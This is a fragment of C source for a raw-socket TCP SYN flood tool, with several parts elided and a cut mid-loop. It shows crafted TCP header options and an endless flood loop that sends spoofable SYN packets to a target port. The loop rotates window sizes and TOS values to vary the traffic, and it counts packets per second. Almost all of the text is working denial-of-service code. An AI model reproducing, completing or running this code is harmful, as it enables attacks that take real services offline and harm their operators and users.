...
void setup_tcp_header(struct tcphdr *tcph)
{
	...
	tcph->check = 0;
	memcpy((void*) tcph + sizeof(struct tcphdr), "\x02\x04\x05\xb4\x04\x02\x08\x0a\xaf\xc1\x9d\x6a\x00\x00\x00\x00\x01\x03\x03\x06", 20);	// tcp options
	tcph->syn = 1;
	tcph->window = htons(64240);
	tcph->doff = ((sizeof(struct tcphdr)) + 20) / 4;
}
...
void *flood(void *par1)
{
	...
	while (1)
	{
		...
		tcph->dest = htons(floodport);
		tcph->check = tcpcsum(iph, tcph, 20);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		int windows[3] = { 29200, 64240, 65535 };
		int ctos[3] = { 0, 40, 72 };
		iph->tos = ctos[randnum(0, 2)];
		char stronka[] = "\x02\x04\x05\xb4\x04\x02\x08\x0a\xaf\xc1\x9d\x6a\x00\x00\x00\x00\x01\x03\x03\x06";
		...
		memcpy((void*) tcph + sizeof(struct tcphdr), newpayload, 20);
		pps++;
		if (i >= limiter)
		{
			i = 0;
